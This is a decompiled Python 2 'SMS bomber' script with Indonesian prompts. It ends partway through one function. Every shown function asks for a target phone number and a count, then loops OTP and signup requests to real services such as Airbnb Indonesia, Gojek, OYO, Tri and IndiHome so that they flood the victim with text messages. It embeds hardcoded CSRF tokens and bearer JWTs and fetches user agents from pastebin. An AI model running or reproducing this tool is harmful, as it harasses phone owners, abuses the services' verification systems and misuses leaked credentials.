# Decompiling At : Tue Apr  7 11:49:25 WIB 2020
# File : Python 2.7
try:
    from getpass import getpass
    import os, time, sys, requests, random, json
    from bs4 import BeautifulSoup as bs
except:
    print 'Modul belum terinstall !!\npip2 install requests bs4\nKetik perintah tsb dan enter'

G0 = '\x1b[0;32m'
G1 = '\x1b[1;32m'
C0 = '\x1b[0;36m'
C1 = '\x1b[1;36m'
P0 = '\x1b[0;35m'
P1 = '\x1b[1;35m'
W0 = '\x1b[0;37m'
W1 = '\x1b[1;37m'
B0 = '\x1b[0;34m'
B1 = '\x1b[1;34m'
R0 = '\x1b[0;31m'
R1 = '\x1b[1;31m'
Y1 = '\x1b[1;33m'
Y0 = '\x1b[0;33m'
BG = '\x1b[1;97;41m'
RE = '\x1b[0m'
r = '\x1b[91m'
c = '\x1b[96m'
w = '\x1b[0m'

def wait(t):
    for x in range(t):
        t -= 1
        sys.stdout.write('\r' + '\x1b[1;37m[\x1b[1;31m!\x1b[1;37m]\x1b[0;37m Tunggu ' + str(t) + 's')
        sys.stdout.flush()
        time.sleep(1)


def spin():
    try:
        L = '\\|/-'
        for q in range(10):
            time.sleep(0.1)
            sys.stdout.write('\r\x1b[1;32m[\x1b[1;33m' + L[(q % len(L))] + '\x1b[1;32m]\x1b[0;37m Waiting')
            sys.stdout.flush()

    except:
        exit()


def ketik(teks):
    for i in teks + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.001)


def metu():
    print '%s[%sx%s] %sExiting Program' % (W1, R1, W1, R0)
    exit(1)


def koneksi():
    logo()
    spin()
    try:
        rq = requests.get('http://github.com')
        print '\n%s[%s+%s] %sKoneksi bagus :)' % (W1, G1, W1, G0)
        time.sleep(2)
    except requests.exceptions.ConnectionError:
        logo()
        print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
        time.sleep(1)
        metu()


def src():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 628XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        src()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        src()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    r = requests.Session()
    head = {'content-length': '27', 'accept': '*/*', 'origin': 'https://nabil.my.id', 'x-requested-with': 'XMLHttpRequest', 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://nabil.my.id/Ayo_Src_Bom', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://nabil.my.id/Tools/Prank-Tools/Ayo-Src/api.php', headers=head, data={'nomor': no, 'jumlah': '1'})
            if 'Terkirim' in str(a.text):
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(5)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(5)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        src()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def air():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 628XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        air()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        air()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    data = {'phoneNumber': no, 'workFlow': 'GLOBAL_SIGNUP_LOGIN', 'otpMethod': 'TEXT'}
    datajson = json.dumps(data)
    hd = {'origin': 'https://www.airbnb.co.id', 'x-csrf-token': 'V4$.airbnb.co.id$pgPRrSWF_-4$VvFL20hLPGSifNfUZuQFk0hBSM2sFv7ptbLjEn1qEp0=', 'x-csrf-without-token': '1', 'user-agent': '{acak}', 'content-type': 'application/json', 'accept': 'application/json, text/javascript, */*; q=0.01', 'cache-control': 'no-cache', 'x-requested-with': 'XMLHttpRequest', 'referer': 'https://www.airbnb.co.id/signup_login', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id', headers=hd, data=datajson)
            if 'success' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(5)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(5)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        air()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def ald():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 08XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        ald()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        ald()
    print
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = requests.post('https://www.misteraladin.com/api/members/otp/request', data={'phone_number_country_code': '62', 'phone_number': no, 'type': 'register'})
            if 'Coba lagi dalam 59 menit' in a.text:
                print '%s[%s%s%s] %sLimit 1 jam, coba lagi nanti' % (W1, R1, z, W1, W0)
                time.sleep(3)
            else:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(5)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        ald()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def tri():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 089XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        tri()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        tri()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    head = {'Host': 'registrasi.tri.co.id', 'Connection': 'keep-alive', 'Content-Length': '59', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Origin': 'https://registrasi.tri.co.id', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': '{acak}', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Referer': 'https://registrasi.tri.co.id/daftar', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = requests.post('https://registrasi.tri.co.id/daftar/generateOTP', headers=head, data={'token': 'rU19E0PpDABQ5CVY2g7uXx7dlr4L5UQx', 'msisdn': no})
            if 'success' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(5)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(5)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        tri()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def oyo():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 8XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        oyo()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        oyo()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    r = requests.Session()
    hd = {'Host': 'www.oyorooms.com', 'xsrf-token': 'PyMZVXFT-wEDYO2Cl-2UYrh7FtvGLDywTnOI', 'user-agent': '{acak}', 'accept': '*/*', 'referer': 'https://www.oyorooms.com/login/?modal=signup', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.get('https://www.oyorooms.com/api/pwa/generateotp?phone=' + no + '&country_code=%2B62&nod=4&locale=id', headers=hd)
            if 'correct' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(5)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(5)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        oyo()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def coda():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 08XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        coda()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        coda()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    head = {'Host': 'revan.mohona.tv', 'Connection': 'keep-alive', 'Content-Length': '18', 'Accept': '*/*', 'Origin': 'http://revan.mohona.tv', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'User-Agent': '{acak}', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'http://revan.mohona.tv/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6,da;q=0.5,pt;q=0.4,jv;q=0.3'}
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = requests.post('http://revan.mohona.tv/codapay2.php', headers=head, data={'target': no}).text
            print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
            time.sleep(1)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        coda()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def map():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 08XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        map()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        map()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    data = {'phone': no}
    datajson = json.dumps(data)
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://cmsapi.mapclub.com/api/signup-otp', data=datajson, headers={'Host': 'cmsapi.mapclub.com', 'Connection': 'keep-alive', 'Content-Length': '23', 'Accept': 'application/json, text/plain, */*', 'Origin': 'https://www.mapclub.com', 'Save-Data': 'on', 'User-Agent': '{acak}', 'content-type': 'application/json', 'Referer': 'https://www.mapclub.com/id/user/signup', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6,da;q=0.5,pt;q=0.4,jv;q=0.3'})
            if 'ok' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(5)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(3)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        map()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def gojek():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: +62XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        gojek()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        gojek()
    print
    hd = {'Accept': 'application/json', 'X-Platform': 'Android', 'X-UniqueId': 'd35889777f55fb15', 'X-AppVersion': '3.40.2', 'X-AppId': 'com.gojek.app', 'X-Session-ID': '2f62c15b-c2c8-4103-b9ee-fcb2e16f38b2', 'X-PhoneModel': 'samsung,SMJ111F', 'X-PushTokenType': 'FCM', 'X-DeviceOS': 'Android,5.1.1', 'User-uuid': '', 'X-DeviceToken': '', 'Authorization': 'Bearer', 'Accept-Language': 'id-ID', 'X-User-Locale': 'id_ID', 'Content-Type': 'application/json; charset=UTF-8', 'Content-Length': '101', 'Host': 'api.gojekapi.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.12.1'}
    data = {'phone': no}
    datajson = json.dumps(data)
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://api.gojekapi.com/v4/customers/login_with_phone', headers=hd, data=datajson)
            if '30 menit' in a.text:
                print '%s[%s%s%s] %sLimit 30 menit, coba lagi nanti' % (W1, R1, z, W1, W0)
                time.sleep(3)
            else:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(5)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        gojek()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def rupa():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 08XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        rupa()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        rupa()
    print
    data = {'phone': no, 'action': 'register', 'channel': 'message', 'email': '', 'customer_id': '0', 'is_resend': '0'}
    datajson = json.dumps(data)
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'origin': 'https://m.ruparupa.com', 'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOWYyN2U2ODMtZmQ4My00MDQ0LWIzMDgtOTM1OWFhZTJlMDAyIiwiaWF0IjoxNTgzNjM5Mjg5LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.uIIXB3QCLDhDnFZ-9i90qtjicRXoRK6V622Dmfvnj1o', 'user-agent': '{acak}', 'content-type': 'application/json', 'accept': 'application/json', 'referer': 'https://m.ruparupa.com/verification?page=otp-choices', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://wapi.ruparupa.com/auth/generate-otp', headers=hd, data=datajson)
            if 'Kode verifikasi berhasil dikirimkan' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                wait(30)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                wait(30)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        rupa()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def idh():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 08XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        idh()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        idh()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'origin': 'https://sobat.indihome.co.id', 'x-requested-with': 'XMLHttpRequest', 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://sobat.indihome.co.id/register', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp', headers=hd, data={'type': 'hp', 'msisdn': no})
            if 'Kode verifikasi telah dikirim' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(5)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(3)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        idh()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def phd2():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 8XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        phd2()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        phd2()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'origin': 'https://www.phd.co.id', 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://www.phd.co.id/en/users/createnewuser', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://www.phd.co.id/en/users/createNewUser', headers=hd, data={'request_id': '', 'first_name': 'Yayak', 'last_name': 'Yk', 'gender': 'male', 'phone_number': no, 'birthday_d': '', 'birthday_m': '', 'birthday_y': '', 'birthday': '1999-03-01', 'username': 'yayakyk22@40gmail.com', 'password': 'Anjaymanar123$$', 'agreeterms': '1'})
            if 'OK' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                wait(30)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                wait(30)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        phd2()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def spl():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 08XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        spl()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        spl()
    print
    data = {'phone_number': no}
    datajson = json.dumps(data)
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'accept': 'application/json, text/plain, */*', 'origin': 'https://m.sepulsa.com', 'authorization': 'bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJ3d3cuc2VwdWxzYS5jb20iLCJleHAiOjE1ODQzNTU3MzYsImlhdCI6MTU4Mzc1MDkzNiwic2NvcGUiOnsib3RwIjoicmVxdWVzdCJ9LCJqdGkiOiI2ZFdaMXJQU0tsMVAyVG16TTYxbDdtcmhuSlN1ei03MXJfVXN1Q1dIWDIwIiwiYXVkIjoiYmFnYXN0cmkzMkBnbWFpbC5jb20ifQ.La5TzFdePQg4vUEFfLfzII72u7_tHjd2mrOpG182BNb_8hfAzq1uPIVkpZhg141xVmbNT3SchjE6hSyU8RVPI4lceXGwMELzYsnXYDAbn3Z7GyZP90ZiEFwBIzWD66VHz0ALJRwX7mkuAGaZkVJlcqQEkOjqk4lpJsrtZouQt4xrVqibfJCkWrTYNaFbbw9WdKZNTmowdyOyZQ4JqawNDG59KjzgmwjwWeR8c79rBUDqQY9lDMkGEQR_TBBl3JP2xGpyTlUTy-IDTeP-Ini2ybyTinycbnbcqJoPqbN6pz5jR5WSowRLH7cqb16rv1rqE6aP1Bza_TjoGRFnWw5gtA', 'source': "frigate'", 'user-agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36', 'content-type': 'application/json', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://gaia.sepulsa.com/bumi/otp/request', headers=hd, data=datajson).text
            print a
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        spl()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def red():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 8XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        red()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        red()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'accept': 'application/json, text/javascript, */*; q=0.01', 'user-agent': '{acak}', 'referer': 'https://m.redbus.id/en/', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.get('https://m.redbus.id/api/getOtp?number=' + no + '&cc=62&whatsAppOpted=false', headers=hd)
            if 'OTP Sent Successfully' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                wait(30)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                wait(30)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        red()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def shp():
    logo()
    r = requests.Session()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: +628XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        shp()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        shp()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.get('https://www.shopback.co.id/login?redirect=/referral/invite#', headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control': 'max-age=0', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': '{acak}'}).text
            b = bs(a, 'html.parser')
            c = b.find('input', attrs={'type': 'hidden', 'name': 'nice_try_token'})
